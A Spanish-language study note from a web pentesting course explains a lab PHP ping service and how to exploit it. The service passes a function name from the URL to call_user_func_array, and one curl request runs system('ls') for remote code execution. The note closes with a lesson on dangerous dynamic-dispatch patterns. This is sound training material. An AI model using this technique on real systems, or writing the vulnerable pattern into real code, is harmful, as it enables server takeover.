---
tags:
  - Web/Red-Team
  - Web-Services
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-17
Nota previa: "[[02 - SOAPAction Spoofing]]"
Nota siguiente: "[[04 - Ataques a xmlrpc.php]]"
Area: "[[Web Services.base|Web Services]]"
---
---

La *command injection* es de las vulnerabilidades más críticas en web services: <mark style="background: #FFB86CA6;">ejecuta comandos del sistema directamente en el back-end</mark>. Si el servicio usa entrada controlada por el usuario para construir o invocar un comando, un atacante puede subvertirlo. La teoría general está en [[00 - Introducción a Command Injection|Command Injection]]; aquí el foco es cómo aparece en un servicio programático.

# El escenario: un servicio de conectividad

Servicios que hacen `ping` a un host que eliges (paneles de router, comprobadores de conectividad) son terreno habitual. El del lab reside en `http://<TARGET>:3003/ping-server.php/ping`, con este código fuente:

```php
<?php
function ping($host_url_ip, $packets) {
    if (!in_array($packets, array(1, 2, 3, 4))) {
        die('Only 1-4 packets!');
    }
    $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
    echo implode("\n", array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $prt = explode('/', $_SERVER['PATH_INFO']);
    call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

# El bug no está donde parece

A primera vista el objetivo sería inyectar en el argumento del `ping`. Pero <mark style="background: #FFB8EBA6;">`escapeshellarg()` está bien aplicado</mark>: envuelve `$host_url_ip` en comillas simples y escapa las existentes, neutralizando la inyección de argumentos clásica. Ese camino está cerrado.

El fallo real está en la última línea:

```php
call_user_func_array($prt[1], array_slice($prt, 2));
```

<mark style="background: #FF5582A6;">`call_user_func_array` invoca la función **cuyo nombre viene en la URL** (`$prt[1]`)</mark>, con los siguientes segmentos como argumentos. La petición prevista es `.../ping-server.php/ping/<IP>/3` → llama a `ping('<IP>', '3')`. Pero nada obliga a que la función sea `ping`:

```shell-session
$ curl http://<TARGET>:3003/ping-server.php/system/ls
index.php
ping-server.php
```

`.../ping-server.php/system/ls` invoca `system('ls')` directamente. <mark style="background: #8000E1A6;">El atacante elige qué función PHP se ejecuta</mark> — `system`, `exec`, `passthru`, `shell_exec`… con sus argumentos. RCE total sin tocar el `ping`.

> [!warning]+ La lección: sanea el dato correcto
> Es un fallo de manual y aleccionador: los desarrolladores blindaron el argumento del comando (`escapeshellarg`) pero <mark style="background: #FFB86CA6;">dejaron que el usuario controlara **qué función se llama**</mark>. Sanear la entrada equivocada da falsa sensación de seguridad. Patrones peligrosos a buscar en código: `call_user_func`, `call_user_func_array`, `$$var`, `array_map($fn, ...)` con `$fn` controlable — todo *dynamic dispatch* sobre entrada del usuario.

La inyección de comandos aquí es directa; en un servicio SOAP, el mismo dato controlado puede llegar por un parámetro del `Body` XML. Siguiente: el caso especial de XML-RPC en WordPress, con sus vectores propios más allá del RCE: [[04 - Ataques a xmlrpc.php]].
